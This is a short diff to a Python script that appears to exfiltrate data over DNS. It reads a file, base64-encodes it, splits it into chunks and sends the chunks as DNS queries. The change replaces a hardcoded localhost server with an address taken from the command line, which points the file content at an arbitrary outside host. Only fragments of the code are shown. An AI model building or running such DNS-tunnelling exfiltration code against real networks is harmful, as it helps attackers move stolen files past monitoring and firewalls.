@@ -1,5 +1,7 @@
 from dns import resolver
 import base64
+import sys
+
 
 def send_dns_query(domain, dns_server):
     try:
@@ -29,7 +31,9 @@ def split_bytes(data, chunk_size):
 
 
 if __name__ == '__main__':
-    server_addr = "127.0.0.1"
+    server_addr = sys.argv[1]
+
+    print(f"Sending data to {server_addr}")
 
     file_content = readTextFile()
     b64Content = encodeBase64(file_content)
